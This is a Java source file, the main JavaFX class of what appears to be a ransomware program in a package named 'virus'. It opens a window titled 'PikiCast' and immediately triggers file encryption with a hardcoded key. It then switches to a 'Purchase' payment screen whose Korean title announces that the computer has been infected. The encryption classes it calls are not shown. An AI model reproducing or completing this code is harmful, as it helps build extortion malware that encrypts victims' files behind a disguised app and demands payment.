package com.virus;


import com.virus.security.CryptoUtils;
import com.virus.security.SearchDirectory;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Parent;
import javafx.scene.Scene;
import javafx.scene.paint.Color;
import javafx.stage.Stage;

import java.io.File;
import java.util.ArrayList;

public class Main extends Application {

    public static Stage stage;
    public static Scene scene;
    public static EncryptionController encryptionController;


    public Main()
    {
        this.encryptionController= new EncryptionController("Mary has onecat1");
    }

    public static void main(String[] args)
    {
        launch(args);
    }

    @Override
    public void start(Stage stage) throws Exception {

        this.scene = new Scene(FXMLLoader.load(getClass().getResource("MainPage.fxml")));

        stage.setScene(this.scene);
        this.stage = stage;
        this.stage.setTitle("PikiCast");
        this.stage.show();

        if(encryptionController.isEncrypted())
        {
            System.out.print("이미 감염되있는 PC입니다");
            this.scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
            stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
            stage.setScene(this.scene);
        }
        else
        {
            encryptionController.encryption();
            this.scene = new Scene(FXMLLoader.load(getClass().getResource("Purchase.fxml")));
            stage.setTitle("당신의 컴퓨터는 감염되었습니다!");
            stage.setScene(this.scene);
        }
    }
    public static void changeToUndecryptedScene()
    {
        System.out.print("복호화 화면으로 전환합니다");
//        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
//        stage.setScene(this.scene);
    }
    public static void changeToCompleteScene()
    {
        System.out.print("복호화 축하 화면으로 전환합니다");
//        this.scene = new Scene(FXMLLoader.load(getClass().getResource("Undecripted.fxml")));
//        stage.setScene(this.scene);
    }

}
